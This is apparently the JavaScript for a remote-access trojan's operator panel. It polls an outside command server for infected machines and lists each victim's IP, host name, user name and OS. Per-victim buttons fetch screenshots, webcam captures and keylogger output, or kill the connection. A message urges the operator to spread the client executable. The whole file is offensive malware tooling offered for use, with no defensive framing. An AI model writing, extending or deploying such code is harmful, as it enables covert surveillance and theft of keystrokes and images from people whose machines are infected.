let SOCKETS_N = 0

function display() {
  let sockets = JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets'))
  
  if(sockets.length == 0) {
    document.querySelector(`#sockets`).innerHTML = "<span>No opened sockets. Try spreading the <a href='/dl/client.exe'>client</a> !</span>"
    return
  }
  
  document.querySelector(`#sockets`).innerHTML  = ""

  for(let s=0; s < sockets.length; s++) {
    let socket = sockets[s]
    document.querySelector(`#sockets`).innerHTML += `<div class="socket">
      <span>${socket.shard || "🔹"}</span>
      <span>${socket.id}</span>
      <span>${socket.ip}</span>
      <span>${socket.host}</span>
      <span>${socket.name}</span>
      <span>${socket.os}</span>
      <ion-icon name="desktop-outline" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
      <ion-icon name="camera-outline" onclick="image('${socket.id}', 'webcam')"></ion-icon>
      <ion-icon name="receipt-outline" onclick="text('${socket.id}', 'keylog')"></ion-icon>
      <ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>
    </div>`
  }
}

setInterval(() => {
  display()
}, 1000)

let loading = `<img src="cdn/loading.gif" id="loading">`
document.querySelector('#render').innerHTML = loading

function image(id, method) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
  let img = JSON.parse(get(url)).base64 || "url(assets/404.png)"
  document.querySelector('#render').innerHTML = loading + `<img id='render-img' src='${img}'>`
}

function text(id, method) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
  let res = JSON.parse(get(url)).rawtext || "No text found"
  document.querySelector('#render').innerHTML = loading + `<p class="render-text">${res}</p>`
}

function kill(id) {
  let url = `https://gate-serv.kitsuforyou.repl.co/do/kill/${id}`
  if(confirm(`Do you really want to kill this socket ? This action is irreversible.`)) {
    get(url)
    document.querySelector('#render').innerHTML = loading
  }
}